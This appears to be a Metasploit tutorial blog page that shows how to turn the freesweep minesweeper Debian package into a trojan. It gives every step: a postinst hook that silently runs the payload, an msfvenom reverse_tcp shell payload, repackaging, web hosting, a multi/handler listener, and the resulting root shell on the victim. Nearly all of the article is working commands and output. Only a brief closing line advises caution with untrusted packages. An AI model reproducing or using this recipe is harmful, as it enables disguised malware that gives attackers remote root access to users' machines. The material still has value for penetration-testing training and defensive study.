---
draft: false
title: MSF Binary Linux Trojan
linkTitle: MSF Binary Linux Trojan
translationKey: msf-binary-linux-trojan
weight: 210
date: 2017-05-20T13:12:00+03:00
author: İbrahim Korucuoğlu ([@siberoloji](https://github.com/siberoloji))
description: We can create a Debian package that contains a payload using Metasploit Framework.
url: /msf-binary-linux-trojan/
featured_image: /images/metasploit.jpg
categories:
    - Metasploit Framework
tags:
    - cybersecurity
    - metasploit framework
---
As an example of client-side attacks, in our previous article we created an executable file with the extension `.exe` for the Windows platform. We can also create files in the click-and-run file types used by Linux operating systems. In this article, we will create a file with the extension `.deb`.

Creating this file targeting the Ubuntu operating system may seem a bit complicated at first, but it will be easier to understand if you continue by examining the steps one by one.

First, we need a program to place a payload in. Let's use the "Mine Sweeper" program as an example.

## Let's download the package

When we download the package with the `--download-only` parameter, it will not be installed on our operating system. Then we will move the package we downloaded to the `/tmp/evil` folder that we will create to work on it.

```bash
root@kali:~# apt-get --download-only install freesweep
Reading package lists... Done
Building dependency tree
Reading state information... Done
...snip...
root@kali:~# mkdir /tmp/evil
root@kali:~# mv /var/cache/apt/archives/freesweep_0.90-1_i386.deb /tmp/evil
root@kali:~# cd /tmp/evil/
root@kali:/tmp/evil#
```

Now we have a Debian package named `freesweep_0.90-1_i386.deb` in the `/tmp/evil` folder. The name and version number of the .deb file you downloaded may be different. You should check its name with the `ls` command and apply it to the commands in the examples accordingly.

## Let's Open the Package

Now we need to open this `.deb` extension package in a similar way to opening a compressed file. We extract this package to the `work` folder in the `/tmp/evil` folder with the following command. Then, we create a folder named `DEBIAN` under the `/tmp/evil/work` folder, where the features we will add will be located.

```bash
root@kali:/tmp/evil# dpkg -x freesweep_0.90-1_i386.deb work
root@kali:/tmp/evil# mkdir work/DEBIAN
```

## Let's create a control file

We create a file named `control` in the Debian folder, paste the following text into it and save it. We check the file content with the `cat control` command as follows.

**control** file content

```bash
Package: freesweep
Version: 0.90-1
Section: Games and Amusement
Priority: optional
Architecture: i386
Maintainer: Ubuntu MOTU Developers (ubuntu-motu@lists.ubuntu.com)
Description: a text-based minesweeper
 Freesweep is an implementation of the popular minesweeper game, where
 one tries to find all the mines without igniting any, based on hints given
 by the computer. Unlike most implementations of this game, Freesweep
 works **in **any visual text display - **in **Linux console, **in **an xterm, and **in
 **most text-based terminals currently **in **use.
```

## let's create a postinst file

We also need another bash script file to run after installation. Again, as above, we create a file named `postinst` in the `DEBIAN` folder. We paste the following lines of code into it.

**postinst** file content

```bash
#!/bin/sh

sudo chmod 2755 /usr/games/freesweep_scores && /usr/games/freesweep_scores &amp; /usr/games/freesweep &amp;
```

## Let's Create a Payload

Now we can create the file containing the malicious codes. For this, we will use the `linux/x86/shell/reverse_tcp` payload module using the command below. You can specify the variables we gave as `LHOST` and `LPORT` in the command yourself.

```bash
root@kali:~# msfvenom -a x86 --platform linux -p linux/x86/shell/reverse_tcp LHOST=192.168.1.101 LPORT=443 -b "\x00" -f elf -o /tmp/evil/work/usr/games/freesweep_scores
Found 10 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 98 (iteration=0)
x86/shikata_ga_nai chosen with final size 98
Payload size: 98 bytes
Saved as: /tmp/evil/work/usr/games/freesweep_scores
```

## Repackaging

Now, we can make our `postinst` file executable and compile the `.deb` package. We can change the name of the `work.deb` package that will be created as a result of the command to `freesweep.deb` and upload it to the Apache Server folder (`/var/www` or `/var/www/html`). Now our file can be downloaded from the Web server.

```bash
root@kali:/tmp/evil/work/DEBIAN# chmod 755 postinst
root@kali:/tmp/evil/work/DEBIAN# dpkg-deb --build /tmp/evil/work
dpkg-deb: building package `freesweep' in `/tmp/evil/work.deb'.
root@kali:/tmp/evil# mv work.deb freesweep.deb
root@kali:/tmp/evil# cp freesweep.deb /var/www/
```

## Creating a Listener Handler

Now, let's create a listener to listen for connection requests that will come with a click or run. The `LHOST` and `LPORT` values ​​that we will give to the command here must be the same as the values ​​entered when creating the payload.

```bash
root@kali:~# msfconsole -q -x "use exploit/multi/handler;set PAYLOAD linux/x86/shell/reverse_tcp; set LHOST 192.168.1.101; set LPORT 443; run; exit -y"
PAYLOAD => linux/x86/shell/reverse_tcp
LHOST => 192.168.1.101
LPORT => 443
> Started reverse handler on 192.168.1.101:443
> Starting the payload handler...
```

## Result

When any user downloads and runs this `freesweep.deb` package that we prepared, our listening `exploit/multi/handler` module will log in to the target computer.

```bash
ubuntu@ubuntu:~$ wget <a href="http://192.168.1.101/freesweep.deb">http://192.168.1.101/freesweep.deb</a>
ubuntu@ubuntu:~$ sudo dpkg -i freesweep.deb

> Sending stage (36 bytes)
> Command shell session 1 opened (192.168.1.101:443 -> 192.168.1.175:1129)

ifconfig
eth1 Link encap:Ethernet HWaddr 00:0C:29:C2:E7:E6
inet addr:192.168.1.175 Bcast:192.168.1.255 Mask:255.255.255.0
UP BROADCAST RUNNING MULTICAST MTU:1500 Metric:1
RX packets:49 errors:0 dropped:0 overruns:0 frame:0
TX packets:51 errors:0 dropped:0 overruns:0 carrier:0
collisions:0 txqueuelen:1000
RX bytes:43230 (42.2 KiB) TX bytes:4603 (4.4 KiB)
Interrupt:17 Base address:0x1400
...snip...

hostname
ubuntu
id
uid=0(root) gid=0(root) groups=0(root)
```

## Recommendation

As can be seen, malware is not only specific to Windows. Linux users should also be careful with click-to-run programs. We recommend that you do not install packages from unreliable sources.
